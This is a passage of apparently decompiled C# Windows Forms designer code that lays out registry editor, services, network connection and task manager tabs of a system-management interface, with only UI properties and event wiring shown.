        this.lstRegistryValues.SmallImageList = this.imageRegistryKeyTypeList;
        this.lstRegistryValues.TabIndex = 0;
        this.lstRegistryValues.UseCompatibleStateImageBehavior = false;
        this.lstRegistryValues.View = System.Windows.Forms.View.Details;
        this.lstRegistryValues.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(lstRegistryValues_AfterLabelEdit);
        this.lstRegistryValues.KeyUp += new System.Windows.Forms.KeyEventHandler(lstRegistryValues_KeyUp);
        this.lstRegistryValues.MouseUp += new System.Windows.Forms.MouseEventHandler(lstRegistryValues_MouseUp);
        this.hName.Text = "Name";
        this.hName.Width = 173;
        this.hType.Text = "Type";
        this.hType.Width = 104;
        this.hValue.Text = "Value";
        this.hValue.Width = 214;
        this.imageRegistryKeyTypeList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryKeyTypeList.ImageStream");
        this.imageRegistryKeyTypeList.TransparentColor = System.Drawing.Color.Transparent;
        this.imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
        this.imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
        this.menuStrip.BackColor = System.Drawing.Color.White;
        this.menuStrip.Dock = System.Windows.Forms.DockStyle.None;
        this.menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.editToolStripMenuItem });
        this.menuStrip.Location = new System.Drawing.Point(0, 0);
        this.menuStrip.Name = "menuStrip";
        this.menuStrip.Size = new System.Drawing.Size(47, 24);
        this.menuStrip.TabIndex = 2;
        this.editToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.modifyToolStripMenuItem1, this.modifyBinaryDataToolStripMenuItem1, this.modifyNewtoolStripSeparator, this.newToolStripMenuItem2, this.toolStripSeparator6, this.deleteToolStripMenuItem2, this.renameToolStripMenuItem2 });
        this.editToolStripMenuItem.Name = "editToolStripMenuItem";
        this.editToolStripMenuItem.Size = new System.Drawing.Size(39, 20);
        this.editToolStripMenuItem.Text = "Edit";
        this.modifyToolStripMenuItem1.Enabled = false;
        this.modifyToolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.modifyToolStripMenuItem1.Name = "modifyToolStripMenuItem1";
        this.modifyToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.modifyToolStripMenuItem1.Text = "Modify...";
        this.modifyToolStripMenuItem1.Visible = false;
        this.modifyToolStripMenuItem1.Click += new System.EventHandler(modifyToolStripMenuItem1_Click);
        this.modifyBinaryDataToolStripMenuItem1.Enabled = false;
        this.modifyBinaryDataToolStripMenuItem1.Name = "modifyBinaryDataToolStripMenuItem1";
        this.modifyBinaryDataToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.modifyBinaryDataToolStripMenuItem1.Text = "Modify Binary Data...";
        this.modifyBinaryDataToolStripMenuItem1.Visible = false;
        this.modifyBinaryDataToolStripMenuItem1.Click += new System.EventHandler(modifyBinaryDataToolStripMenuItem1_Click);
        this.modifyNewtoolStripSeparator.Name = "modifyNewtoolStripSeparator";
        this.modifyNewtoolStripSeparator.Size = new System.Drawing.Size(181, 6);
        this.modifyNewtoolStripSeparator.Visible = false;
        this.newToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem2, this.toolStripSeparator7, this.stringValueToolStripMenuItem2, this.binaryValueToolStripMenuItem2, this.dWORD32bitValueToolStripMenuItem2, this.qWORD64bitValueToolStripMenuItem2, this.multiStringValueToolStripMenuItem2, this.expandableStringValueToolStripMenuItem2 });
        this.newToolStripMenuItem2.Name = "newToolStripMenuItem2";
        this.newToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.newToolStripMenuItem2.Text = "New";
        this.keyToolStripMenuItem2.Name = "keyToolStripMenuItem2";
        this.keyToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem2.Text = "Key";
        this.keyToolStripMenuItem2.Click += new System.EventHandler(keyToolStripMenuItem2_Click);
        this.toolStripSeparator7.Name = "toolStripSeparator7";
        this.toolStripSeparator7.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem2.Name = "stringValueToolStripMenuItem2";
        this.stringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem2.Text = "String Value";
        this.stringValueToolStripMenuItem2.Click += new System.EventHandler(stringValueToolStripMenuItem2_Click);
        this.binaryValueToolStripMenuItem2.Name = "binaryValueToolStripMenuItem2";
        this.binaryValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem2.Text = "Binary Value";
        this.binaryValueToolStripMenuItem2.Click += new System.EventHandler(binaryValueToolStripMenuItem2_Click);
        this.dWORD32bitValueToolStripMenuItem2.Name = "dWORD32bitValueToolStripMenuItem2";
        this.dWORD32bitValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem2.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem2.Click += new System.EventHandler(dWORD32bitValueToolStripMenuItem2_Click);
        this.qWORD64bitValueToolStripMenuItem2.Name = "qWORD64bitValueToolStripMenuItem2";
        this.qWORD64bitValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem2.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem2.Click += new System.EventHandler(qWORD64bitValueToolStripMenuItem2_Click);
        this.multiStringValueToolStripMenuItem2.Name = "multiStringValueToolStripMenuItem2";
        this.multiStringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem2.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem2.Click += new System.EventHandler(multiStringValueToolStripMenuItem2_Click);
        this.expandableStringValueToolStripMenuItem2.Name = "expandableStringValueToolStripMenuItem2";
        this.expandableStringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem2.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem2.Click += new System.EventHandler(expandableStringValueToolStripMenuItem2_Click);
        this.toolStripSeparator6.Name = "toolStripSeparator6";
        this.toolStripSeparator6.Size = new System.Drawing.Size(181, 6);
        this.deleteToolStripMenuItem2.Enabled = false;
        this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
        this.deleteToolStripMenuItem2.ShortcutKeyDisplayString = "Del";
        this.deleteToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.deleteToolStripMenuItem2.Text = "Delete";
        this.deleteToolStripMenuItem2.Click += new System.EventHandler(deleteToolStripMenuItem2_Click);
        this.renameToolStripMenuItem2.Enabled = false;
        this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
        this.renameToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.renameToolStripMenuItem2.Text = "Rename";
        this.renameToolStripMenuItem2.Click += new System.EventHandler(renameToolStripMenuItem2_Click);
        this.PageServices.Controls.Add(this.Panel5);
        this.PageServices.Location = new System.Drawing.Point(4, 4);
        this.PageServices.Name = "PageServices";
        this.PageServices.Size = new System.Drawing.Size(737, 465);
        this.PageServices.TabIndex = 10;
        this.PageServices.Text = "Services";
        this.PageServices.UseVisualStyleBackColor = true;
        this.Panel5.Controls.Add(this.ListServices);
        this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel5.Location = new System.Drawing.Point(0, 0);
        this.Panel5.Name = "Panel5";
        this.Panel5.Size = new System.Drawing.Size(737, 465);
        this.Panel5.TabIndex = 1;
        this.ListServices.AllowUserToAddRows = false;
        this.ListServices.AllowUserToDeleteRows = false;
        this.ListServices.AllowUserToResizeColumns = false;
        this.ListServices.AllowUserToResizeRows = false;
        dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListServices.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle9;
        this.ListServices.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListServices.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListServices.BackgroundColor = System.Drawing.Color.White;
        this.ListServices.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListServices.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListServices.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListServices.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle10.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListServices.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle10;
        this.ListServices.ColumnHeadersHeight = 30;
        this.ListServices.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListServices.Columns.AddRange(this.dataGridViewImageColumn1, this.Column6, this.dataGridViewTextBoxColumn1, this.Column4, this.Column5);
        this.ListServices.ContextMenuStrip = this.ContexServices;
        dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle11.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle11.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListServices.DefaultCellStyle = dataGridViewCellStyle11;
        this.ListServices.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListServices.EnableHeadersVisualStyles = false;
        this.ListServices.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListServices.Location = new System.Drawing.Point(0, 0);
        this.ListServices.Name = "ListServices";
        this.ListServices.ReadOnly = true;
        this.ListServices.RowHeadersVisible = false;
        this.ListServices.RowHeadersWidth = 27;
        this.ListServices.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListServices.ShowCellErrors = false;
        this.ListServices.ShowEditingIcon = false;
        this.ListServices.ShowRowErrors = false;
        this.ListServices.Size = new System.Drawing.Size(737, 465);
        this.ListServices.TabIndex = 659;
        this.ListServices.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListServices.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListServices.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListServices.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListServices.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListServices.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListServices.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListServices.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListServices.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListServices.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListServices.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListServices.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListServices.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListServices.ThemeStyle.HeaderStyle.Height = 30;
        this.ListServices.ThemeStyle.ReadOnly = true;
        this.ListServices.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListServices.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListServices.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListServices.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListServices.ThemeStyle.RowsStyle.Height = 22;
        this.ListServices.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListServices.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn1.HeaderText = "";
        this.dataGridViewImageColumn1.Name = "dataGridViewImageColumn1";
        this.dataGridViewImageColumn1.ReadOnly = true;
        this.dataGridViewImageColumn1.Width = 5;
        this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column6.HeaderText = "Services";
        this.Column6.Name = "Column6";
        this.Column6.ReadOnly = true;
        this.Column6.Width = 80;
        this.dataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn1.DefaultCellStyle = dataGridViewCellStyle12;
        this.dataGridViewTextBoxColumn1.HeaderText = "Name";
        this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
        this.dataGridViewTextBoxColumn1.ReadOnly = true;
        this.dataGridViewTextBoxColumn1.Width = 68;
        this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.Column4.HeaderText = "Type";
        this.Column4.Name = "Column4";
        this.Column4.ReadOnly = true;
        this.Column4.Width = 60;
        this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column5.HeaderText = "State";
        this.Column5.Name = "Column5";
        this.Column5.ReadOnly = true;
        this.ContexServices.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexServices.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RefreshToolStripMenuItem2, this.StartToolStripMenuItem, this.StopToolStripMenuItem });
        this.ContexServices.Name = "ContexServices";
        this.ContexServices.Size = new System.Drawing.Size(118, 82);
        this.RefreshToolStripMenuItem2.BackColor = System.Drawing.Color.White;
        this.RefreshToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("RefreshToolStripMenuItem2.Image");
        this.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2";
        this.RefreshToolStripMenuItem2.Size = new System.Drawing.Size(117, 26);
        this.RefreshToolStripMenuItem2.Text = "Refresh";
        this.RefreshToolStripMenuItem2.Click += new System.EventHandler(RefreshToolStripMenuItem2_Click);
        this.StartToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.StartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("StartToolStripMenuItem.Image");
        this.StartToolStripMenuItem.Name = "StartToolStripMenuItem";
        this.StartToolStripMenuItem.Size = new System.Drawing.Size(117, 26);
        this.StartToolStripMenuItem.Text = "Start";
        this.StartToolStripMenuItem.Click += new System.EventHandler(StartToolStripMenuItem_Click);
        this.StopToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.StopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("StopToolStripMenuItem.Image");
        this.StopToolStripMenuItem.Name = "StopToolStripMenuItem";
        this.StopToolStripMenuItem.Size = new System.Drawing.Size(117, 26);
        this.StopToolStripMenuItem.Text = "Stop";
        this.StopToolStripMenuItem.Click += new System.EventHandler(StopToolStripMenuItem_Click);
        this.PageConnect.Controls.Add(this.Panel6);
        this.PageConnect.Location = new System.Drawing.Point(4, 4);
        this.PageConnect.Name = "PageConnect";
        this.PageConnect.Size = new System.Drawing.Size(737, 465);
        this.PageConnect.TabIndex = 6;
        this.PageConnect.Text = "Connection";
        this.PageConnect.UseVisualStyleBackColor = true;
        this.Panel6.Controls.Add(this.ListConnection);
        this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel6.Location = new System.Drawing.Point(0, 0);
        this.Panel6.Name = "Panel6";
        this.Panel6.Size = new System.Drawing.Size(737, 465);
        this.Panel6.TabIndex = 1;
        this.ListConnection.AllowUserToAddRows = false;
        this.ListConnection.AllowUserToDeleteRows = false;
        this.ListConnection.AllowUserToResizeColumns = false;
        this.ListConnection.AllowUserToResizeRows = false;
        dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListConnection.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle13;
        this.ListConnection.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListConnection.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListConnection.BackgroundColor = System.Drawing.Color.White;
        this.ListConnection.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListConnection.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListConnection.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListConnection.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle14.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListConnection.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle14;
        this.ListConnection.ColumnHeadersHeight = 30;
        this.ListConnection.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListConnection.Columns.AddRange(this.dataGridViewImageColumn3, this.dataGridViewTextBoxColumn4, this.dataGridViewTextBoxColumn5, this.dataGridViewTextBoxColumn6, this.dataGridViewTextBoxColumn7, this.Column7);
        this.ListConnection.ContextMenuStrip = this.ContexServices_1;
        dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle15.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle15.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle15.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle15.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListConnection.DefaultCellStyle = dataGridViewCellStyle15;
        this.ListConnection.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListConnection.EnableHeadersVisualStyles = false;
        this.ListConnection.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListConnection.Location = new System.Drawing.Point(0, 0);
        this.ListConnection.Name = "ListConnection";
        this.ListConnection.ReadOnly = true;
        this.ListConnection.RowHeadersVisible = false;
        this.ListConnection.RowHeadersWidth = 27;
        this.ListConnection.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListConnection.ShowCellErrors = false;
        this.ListConnection.ShowEditingIcon = false;
        this.ListConnection.ShowRowErrors = false;
        this.ListConnection.Size = new System.Drawing.Size(737, 465);
        this.ListConnection.TabIndex = 660;
        this.ListConnection.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListConnection.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListConnection.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListConnection.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListConnection.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListConnection.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListConnection.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListConnection.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListConnection.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListConnection.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListConnection.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListConnection.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListConnection.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListConnection.ThemeStyle.HeaderStyle.Height = 30;
        this.ListConnection.ThemeStyle.ReadOnly = true;
        this.ListConnection.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListConnection.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListConnection.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListConnection.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListConnection.ThemeStyle.RowsStyle.Height = 22;
        this.ListConnection.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListConnection.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn3.HeaderText = "";
        this.dataGridViewImageColumn3.Name = "dataGridViewImageColumn3";
        this.dataGridViewImageColumn3.ReadOnly = true;
        this.dataGridViewImageColumn3.Width = 5;
        this.dataGridViewTextBoxColumn4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn4.HeaderText = "Name";
        this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
        this.dataGridViewTextBoxColumn4.ReadOnly = true;
        this.dataGridViewTextBoxColumn4.Width = 68;
        this.dataGridViewTextBoxColumn5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn5.DefaultCellStyle = dataGridViewCellStyle16;
        this.dataGridViewTextBoxColumn5.HeaderText = "PID";
        this.dataGridViewTextBoxColumn5.Name = "dataGridViewTextBoxColumn5";
        this.dataGridViewTextBoxColumn5.ReadOnly = true;
        this.dataGridViewTextBoxColumn5.Width = 54;
        this.dataGridViewTextBoxColumn6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn6.HeaderText = "IP Address";
        this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
        this.dataGridViewTextBoxColumn6.ReadOnly = true;
        this.dataGridViewTextBoxColumn6.Width = 97;
        this.dataGridViewTextBoxColumn7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn7.HeaderText = "Remote Address";
        this.dataGridViewTextBoxColumn7.Name = "dataGridViewTextBoxColumn7";
        this.dataGridViewTextBoxColumn7.ReadOnly = true;
        this.dataGridViewTextBoxColumn7.Width = 132;
        this.Column7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column7.HeaderText = "State";
        this.Column7.Name = "Column7";
        this.Column7.ReadOnly = true;
        this.ContexServices_1.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexServices_1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem_0, this.KillConnect });
        this.ContexServices_1.Name = "ContexServices";
        this.ContexServices_1.Size = new System.Drawing.Size(118, 56);
        this.toolStripMenuItem_0.BackColor = System.Drawing.Color.White;
        this.toolStripMenuItem_0.Image = (System.Drawing.Image)resources.GetObject("RefreshConnectionTCP.Image");
        this.toolStripMenuItem_0.Name = "RefreshConnectionTCP";
        this.toolStripMenuItem_0.Size = new System.Drawing.Size(117, 26);
        this.toolStripMenuItem_0.Text = "Refresh";
        this.toolStripMenuItem_0.Click += new System.EventHandler(RefreshConnectionTCP_Click);
        this.KillConnect.BackColor = System.Drawing.Color.White;
        this.KillConnect.Image = (System.Drawing.Image)resources.GetObject("KillConnect.Image");
        this.KillConnect.Name = "KillConnect";
        this.KillConnect.Size = new System.Drawing.Size(117, 26);
        this.KillConnect.Text = "Kill";
        this.KillConnect.Click += new System.EventHandler(KillConnect_Click);
        this.PageTaskManager.Controls.Add(this.Panel7);
        this.PageTaskManager.Location = new System.Drawing.Point(4, 4);
        this.PageTaskManager.Name = "PageTaskManager";
        this.PageTaskManager.Size = new System.Drawing.Size(737, 465);
        this.PageTaskManager.TabIndex = 3;
        this.PageTaskManager.Text = "Task Manager";
        this.PageTaskManager.UseVisualStyleBackColor = true;
        this.Panel7.Controls.Add(this.ListProcess);
        this.Panel7.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel7.Location = new System.Drawing.Point(0, 0);
        this.Panel7.Name = "Panel7";
        this.Panel7.Size = new System.Drawing.Size(737, 465);
        this.Panel7.TabIndex = 1;
        this.ListProcess.AllowUserToAddRows = false;
        this.ListProcess.AllowUserToDeleteRows = false;
        this.ListProcess.AllowUserToResizeColumns = false;
        this.ListProcess.AllowUserToResizeRows = false;
        dataGridViewCellStyle17.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListProcess.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle17;
        this.ListProcess.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListProcess.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListProcess.BackgroundColor = System.Drawing.Color.White;
        this.ListProcess.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListProcess.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListProcess.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListProcess.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle18.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle18.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle18.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle18.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListProcess.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle18;
        this.ListProcess.ColumnHeadersHeight = 30;
        this.ListProcess.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListProcess.Columns.AddRange(this.dataGridViewImageColumn4, this.dataGridViewTextBoxColumn9, this.dataGridViewTextBoxColumn10, this.dataGridViewTextBoxColumn11);
        this.ListProcess.ContextMenuStrip = this.contextTaskManager;
        dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle19.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle19.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle19.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListProcess.DefaultCellStyle = dataGridViewCellStyle19;
        this.ListProcess.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListProcess.EnableHeadersVisualStyles = false;
        this.ListProcess.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListProcess.Location = new System.Drawing.Point(0, 0);
        this.ListProcess.Name = "ListProcess";
        this.ListProcess.ReadOnly = true;
        this.ListProcess.RowHeadersVisible = false;
        this.ListProcess.RowHeadersWidth = 27;
        this.ListProcess.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListProcess.ShowCellErrors = false;
